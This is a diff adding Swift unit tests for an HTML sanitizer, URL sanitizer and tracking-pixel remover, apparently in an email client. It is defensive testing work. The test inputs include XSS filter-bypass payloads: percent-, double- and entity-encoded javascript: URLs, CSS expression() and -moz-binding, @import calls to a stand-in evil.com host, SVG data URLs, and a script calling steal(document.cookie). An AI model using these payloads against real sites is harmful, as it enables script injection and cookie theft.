@@ -542,6 +542,140 @@ final class HTMLSanitizerServiceTests: XCTestCase {
         let result = sut.sanitize(html)
         XCTAssertTrue(result.contains("data:image/gif;base64"))
     }
+
+    // MARK: - Security: URL-Encoded Protocol Bypass Tests
+
+    func testSanitize_urlEncodedJavascript_blocks() {
+        // java%73cript: should be detected after decoding
+        let html = "<a href=\"java%73cript:alert('xss')\">Click</a>"
+        let result = sut.sanitize(html)
+        XCTAssertFalse(result.contains("java%73cript:"))
+        XCTAssertTrue(result.contains("href=\"#\""))
+    }
+
+    func testSanitize_htmlEntityEncodedJavascript_blocks() {
+        // &#106;avascript: should be detected after decoding (&#106; = 'j')
+        let html = "<a href=\"&#106;avascript:alert('xss')\">Click</a>"
+        let result = sut.sanitize(html)
+        XCTAssertTrue(result.contains("href=\"#\""))
+    }
+
+    func testSanitize_hexEntityEncodedJavascript_blocks() {
+        // &#x6A;avascript: should be detected after decoding (&#x6A; = 'j')
+        let html = "<a href=\"&#x6A;avascript:alert('xss')\">Click</a>"
+        let result = sut.sanitize(html)
+        XCTAssertTrue(result.contains("href=\"#\""))
+    }
+
+    func testSanitize_whitespaceInjectedProtocol_blocks() {
+        // Tabs/newlines in protocol should be normalized
+        let html = "<a href=\"java\tscript:alert('xss')\">Click</a>"
+        let result = sut.sanitize(html)
+        XCTAssertTrue(result.contains("href=\"#\""))
+    }
+
+    func testSanitize_doubleEncodedJavascript_blocks() {
+        // Double percent-encoding: %25 -> % after first decode
+        let html = "<a href=\"java%2573cript:alert('xss')\">Click</a>"
+        let result = sut.sanitize(html)
+        XCTAssertTrue(result.contains("href=\"#\""))
+    }
+
+    // MARK: - Security: Malicious CSS in Style Tags
+
+    func testSanitize_javascriptInStyleTag_removes() {
+        let html = """
+        <style>
+        body { background: url('javascript:alert(1)'); }
+        </style>
+        <p>Content</p>
+        """
+        let result = sut.sanitize(html)
+        XCTAssertTrue(result.contains("<style>"))
+        XCTAssertFalse(result.contains("javascript:"))
+        XCTAssertTrue(result.contains("<p>Content</p>"))
+    }
+
+    func testSanitize_expressionInStyleTag_removes() {
+        let html = """
+        <style>
+        .evil { width: expression(alert('xss')); }
+        </style>
+        <p>Content</p>
+        """
+        let result = sut.sanitize(html)
+        XCTAssertFalse(result.contains("expression"))
+    }
+
+    func testSanitize_mozBindingInStyleTag_removes() {
+        let html = """
+        <style>
+        div { -moz-binding: url('http://evil.com/xss.xml#xss'); }
+        </style>
+        <p>Content</p>
+        """
+        let result = sut.sanitize(html)
+        XCTAssertFalse(result.contains("-moz-binding"))
+    }
+
+    func testSanitize_importInStyleTag_removes() {
+        let html = """
+        <style>
+        @import url('https://evil.com/steal.css');
+        body { color: red; }
+        </style>
+        <p>Content</p>
+        """
+        let result = sut.sanitize(html)
+        XCTAssertFalse(result.contains("@import"))
+        XCTAssertTrue(result.contains("color: red"))
+    }
+
+    // MARK: - Security: SVG XSS Prevention
+
+    func testSanitize_svgDataURL_blocks() {
+        // SVG data URLs can contain scripts and should be blocked
+        let html = "<img src=\"data:image/svg+xml,<svg onload='alert(1)'></svg>\">"
+        let result = sut.sanitize(html)
+        XCTAssertFalse(result.contains("data:image/svg+xml"))
+    }
+
+    func testSanitize_svgDataURLBase64_blocks() {
+        // Even base64-encoded SVGs should be blocked
+        let html = "<img src=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9J2FsZXJ0KDEpJz48L3N2Zz4=\">"
+        let result = sut.sanitize(html)
+        XCTAssertFalse(result.contains("data:image/svg+xml"))
+    }
+
+    // MARK: - Security: cid: URL Handling
+
+    func testSanitize_cidURLInHref_preserves() {
+        // cid: should be allowed since it's used for embedded email images
+        let html = "<a href=\"cid:part1.image@example.com\">View attachment</a>"
+        let result = sut.sanitize(html)
+        XCTAssertTrue(result.contains("cid:part1.image@example.com"))
+    }
+
+    // MARK: - Security: Multiline Script Removal
+
+    func testSanitize_multilineScriptWithNewlines_removes() {
+        let html = """
+        <p>Before</p>
+        <script>
+        var x = 1;
+        function malicious() {
+            steal(document.cookie);
+        }
+        malicious();
+        </script>
+        <p>After</p>
+        """
+        let result = sut.sanitize(html)
+        XCTAssertFalse(result.contains("<script"), "Script tag should be removed")
+        XCTAssertFalse(result.contains("malicious"), "Script content should be removed")
+        XCTAssertTrue(result.contains("<p>Before</p>"))
+        XCTAssertTrue(result.contains("<p>After</p>"))
+    }
 }
 
 // MARK: - HTMLURLSanitizer Tests
@@ -614,8 +748,9 @@ final class HTMLURLSanitizerTests: XCTestCase {
         XCTAssertTrue(sut.isDataURL("data:image/webp;base64,UklGRg..."))
     }
 
-    func testIsDataURL_svgImage_returnsTrue() {
-        XCTAssertTrue(sut.isDataURL("data:image/svg+xml;base64,PHN2Zw..."))
+    func testIsDataURL_svgImage_returnsFalse() {
+        // SVG data URLs are blocked because they can contain scripts
+        XCTAssertFalse(sut.isDataURL("data:image/svg+xml;base64,PHN2Zw..."))
     }
 
     func testIsDataURL_textData_returnsFalse() {
@@ -664,6 +799,44 @@ final class HTMLURLSanitizerTests: XCTestCase {
         let html = "<img src=\"https://example.com/image.jpg\">"
         let result = sut.sanitizeURLs(html)
         XCTAssertTrue(result.contains("https://example.com/image.jpg"))
+    }
+
+    // MARK: - Security: URL-Encoded Bypass Prevention
+
+    func testIsURLSafe_urlEncodedJavascript_returnsFalse() {
+        // java%73cript: should be decoded and blocked
+        XCTAssertFalse(sut.isURLSafe("java%73cript:alert('xss')"))
+    }
+
+    func testIsURLSafe_htmlEntityJavascript_returnsFalse() {
+        // &#106;avascript: should be decoded and blocked
+        XCTAssertFalse(sut.isURLSafe("&#106;avascript:alert('xss')"))
+    }
+
+    func testIsURLSafe_hexEntityJavascript_returnsFalse() {
+        // &#x6A;avascript: should be decoded and blocked
+        XCTAssertFalse(sut.isURLSafe("&#x6A;avascript:alert('xss')"))
+    }
+
+    func testIsURLSafe_mixedCaseJavascript_returnsFalse() {
+        XCTAssertFalse(sut.isURLSafe("JaVaScRiPt:alert('xss')"))
+    }
+
+    func testIsURLSafe_cidURL_returnsTrue() {
+        // cid: should now be allowed
+        XCTAssertTrue(sut.isURLSafe("cid:image001.png@01D12345.67890ABC"))
+    }
+
+    func testIsURLSafe_dataTextHtml_returnsFalse() {
+        // Non-image data URLs should be blocked
+        XCTAssertFalse(sut.isURLSafe("data:text/html,<script>alert(1)</script>"))
+    }
+
+    func testSanitizeURLs_dataTextHtmlSrc_replaces() {
+        let html = "<img src=\"data:text/html,<script>alert(1)</script>\">"
+        let result = sut.sanitizeURLs(html)
+        XCTAssertFalse(result.contains("data:text/html"))
+        XCTAssertTrue(result.contains("data:image/gif;base64"))
     }
 }
 
@@ -750,5 +923,62 @@ final class HTMLTrackingRemoverTests: XCTestCase {
         XCTAssertTrue(result.contains("banner.jpg"))
         XCTAssertTrue(result.contains("logo.png"))
         XCTAssertFalse(result.contains("tracker.com"))
+    }
+
+    // MARK: - Enhanced Tracking Detection Tests
+
+    func testRemoveTrackingPixels_cssSized1x1_removes() {
+        let html = "<img src=\"https://tracker.com/pixel.gif\" style=\"width:1px;height:1px\">"
+        let result = sut.removeTrackingPixels(html)
+        XCTAssertFalse(result.contains("<img"))
+    }
+
+    func testRemoveTrackingPixels_commonFilename_pixelGif_removes() {
+        let html = "<img src=\"https://example.com/assets/pixel.gif\">"
+        let result = sut.removeTrackingPixels(html)
+        XCTAssertFalse(result.contains("<img"))
+    }
+
+    func testRemoveTrackingPixels_commonFilename_spacerGif_removes() {
+        let html = "<img src=\"https://example.com/images/spacer.gif\">"
+        let result = sut.removeTrackingPixels(html)
+        XCTAssertFalse(result.contains("<img"))
+    }
+
+    func testRemoveTrackingPixels_commonFilename_1x1Gif_removes() {
+        let html = "<img src=\"https://example.com/img/1x1.gif\">"
+        let result = sut.removeTrackingPixels(html)
+        XCTAssertFalse(result.contains("<img"))
+    }
+
+    func testRemoveTrackingPixels_metricsSubdomain_removes() {
+        let html = "<img src=\"https://metrics.example.com/track\">"
+        let result = sut.removeTrackingPixels(html)
+        XCTAssertFalse(result.contains("<img"))
+    }
+
+    func testRemoveTrackingPixels_telemetrySubdomain_removes() {
+        let html = "<img src=\"https://telemetry.example.com/collect\">"
+        let result = sut.removeTrackingPixels(html)
+        XCTAssertFalse(result.contains("<img"))
+    }
+
+    func testRemoveTrackingPixels_linkedinTracking_removes() {
+        let html = "<img src=\"https://www.linkedin.com/px/abc123\">"
+        let result = sut.removeTrackingPixels(html)
+        XCTAssertFalse(result.contains("<img"))
+    }
+
+    func testRemoveTrackingPixels_twitterTracking_removes() {
+        let html = "<img src=\"https://t.co/i/adsct?id=123\">"
+        let result = sut.removeTrackingPixels(html)
+        XCTAssertFalse(result.contains("<img"))
+    }
+
+    func testRemoveTrackingPixels_legitimateAnalyticsInPath_preserves() {
+        // "analytics" in path (not subdomain) should be preserved
+        let html = "<img src=\"https://example.com/products/analytics-dashboard.png\" width=\"600\" height=\"400\">"
+        let result = sut.removeTrackingPixels(html)
+        XCTAssertTrue(result.contains("analytics-dashboard.png"))
     }
 }
